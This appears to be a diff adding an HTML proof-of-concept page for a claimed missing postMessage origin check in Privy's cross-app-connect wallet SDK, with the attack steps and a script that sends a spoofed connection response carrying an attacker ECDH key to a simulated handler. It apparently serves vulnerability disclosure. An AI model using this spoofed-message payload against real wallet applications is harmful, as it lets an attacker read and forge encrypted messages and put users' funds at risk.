@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Privy Cross-App postMessage PoC</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace; max-width: 900px; margin: 40px auto; padding: 0 20px; background: #0d1117; color: #c9d1d9; }
+    h1 { color: #f85149; border-bottom: 1px solid #21262d; padding-bottom: 12px; }
+    h2 { color: #58a6ff; margin-top: 24px; }
+    ol, p { line-height: 1.7; }
+    button { background: #f85149; color: white; border: none; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 6px; margin: 16px 0; }
+    button:hover { background: #da3633; }
+    pre { background: #161b22; border: 1px solid #30363d; padding: 16px; overflow-x: auto; font-size: 13px; line-height: 1.5; border-radius: 6px; }
+    code { color: #79c0ff; }
+    .tag { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 12px; font-weight: 600; }
+    .critical { background: #f851491a; color: #f85149; border: 1px solid #f85149; }
+    .info { background: #58a6ff1a; color: #58a6ff; border: 1px solid #58a6ff; }
+  </style>
+</head>
+<body>
+
+<h1>Privy Cross-App Connect &mdash; Missing Origin Validation PoC</h1>
+<p><span class="tag critical">CRITICAL</span> <span class="tag info">CWE-346</span></p>
+
+<p>This page demonstrates that a malicious website can inject fake cross-app
+connection responses into any application using
+<code>@privy-io/cross-app-connect</code>.</p>
+
+<h2>Vulnerability Summary</h2>
+<p>The SDK opens a popup window and registers a <code>window.addEventListener('message', ...)</code>
+handler to receive the connection response. The handler checks
+<code>event.data.type === 'PRIVY_CROSS_APP_CONNECT_RESPONSE'</code> but does
+<strong>not</strong> validate <code>event.origin</code>. Any window, frame, or
+tab can therefore send a spoofed response.</p>
+
+<h2>Attack Flow</h2>
+<ol>
+  <li>A legitimate app uses <code>@privy-io/cross-app-connect</code> to initiate a wallet connection.</li>
+  <li>The SDK opens a popup and listens for postMessage responses.</li>
+  <li>The message handler does <strong>NOT</strong> check <code>event.origin</code>.</li>
+  <li>An attacker page (any origin) sends a crafted <code>PRIVY_CROSS_APP_CONNECT_RESPONSE</code>.</li>
+  <li>The attacker supplies their own ECDH public key.</li>
+  <li>The SDK derives a shared secret using the attacker's key &mdash; the attacker can also derive it.</li>
+  <li>All subsequent encrypted cross-app messages can be read and forged by the attacker.</li>
+</ol>
+
+<h2>Simulation</h2>
+<button id="send-fake">Send Fake Cross-App Response</button>
+<pre id="log"></pre>
+
+<script>
+var log = document.getElementById('log');
+
+function addLog(msg) {
+  log.textContent += new Date().toISOString().replace('T', ' ').slice(0, 19) + '  ' + msg + '\n';
+}
+
+// Simulated attacker-controlled ECDH public key
+var ATTACKER_PUBLIC_KEY = '04' + 'a'.repeat(128);  // fake secp256k1 uncompressed
+var ATTACKER_WALLET = '0xDeAdBeEfDeAdBeEfDeAdBeEfDeAdBeEfDeAdBeEf';
+
+document.getElementById('send-fake').addEventListener('click', function() {
+  addLog('[ATTACKER] Preparing fake cross-app connect response...');
+
+  var fakeResponse = {
+    type: 'PRIVY_CROSS_APP_CONNECT_RESPONSE',
+    providerPublicKey: ATTACKER_PUBLIC_KEY,
+    address: ATTACKER_WALLET,
+    chainType: 'ethereum',
+    exp: Date.now() + 14 * 24 * 60 * 60 * 1000  // 14 days
+  };
+
+  addLog('[ATTACKER] Fake response payload:');
+  addLog(JSON.stringify(fakeResponse, null, 2));
+  addLog('');
+  addLog('[ATTACKER] Sending postMessage to target window...');
+  addLog('[NOTE]    In a real attack this would be:');
+  addLog('          targetWindow.postMessage(fakeResponse, "*")');
+  addLog('');
+  addLog('[VULN]    The handler in @privy-io/cross-app-connect triggerPopup.mjs:');
+  addLog('          - Listens for "message" events');
+  addLog('          - Checks ONLY o.data.type === "PRIVY_CROSS_APP_CONNECT_RESPONSE"');
+  addLog('          - Does NOT check event.origin');
+  addLog('          - Accepts attacker-controlled providerPublicKey');
+  addLog('          - Uses it for ECDH shared secret derivation');
+  addLog('');
+  addLog('[IMPACT]');
+  addLog('  1. Attacker controls the ECDH public key in the key exchange');
+  addLog('  2. Attacker can derive the shared secret');
+  addLog('  3. All subsequent cross-app encrypted messages can be decrypted');
+  addLog('  4. Attacker can forge transaction signing requests');
+  addLog('  5. Wallet funds at risk');
+
+  // Demonstrate the message would be accepted
+  window.postMessage(fakeResponse, '*');
+});
+
+// Simulated vulnerable handler (mirrors Privy\'s actual code)
+window.addEventListener('message', function(event) {
+  // NOTE: This is how Privy's code works - NO origin check
+  if (event.data && event.data.type === 'PRIVY_CROSS_APP_CONNECT_RESPONSE') {
+    addLog('');
+    addLog('[VULNERABLE HANDLER] Message received and ACCEPTED!');
+    addLog('  event.origin:              ' + event.origin);
+    addLog('  event.data.type:           ' + event.data.type);
+    addLog('  event.data.providerPublicKey: ' + event.data.providerPublicKey.slice(0, 30) + '...');
+    addLog('  event.data.address:        ' + event.data.address);
+    addLog('');
+    addLog('[DEMO] In the real SDK, this would:');
+    addLog('  1. Accept the attacker\'s public key for ECDH');
+    addLog('  2. Derive a shared secret the attacker also knows');
+    addLog('  3. Store it in localStorage for 14 days');
+    addLog('  4. Use it to encrypt/decrypt all cross-app messages');
+  }
+});
+
+addLog('PoC ready. Click the button to simulate the attack.');
+addLog('In a real scenario, the attacker page would target the victim\'s window.');
+</script>
+
+</body>
+</html>
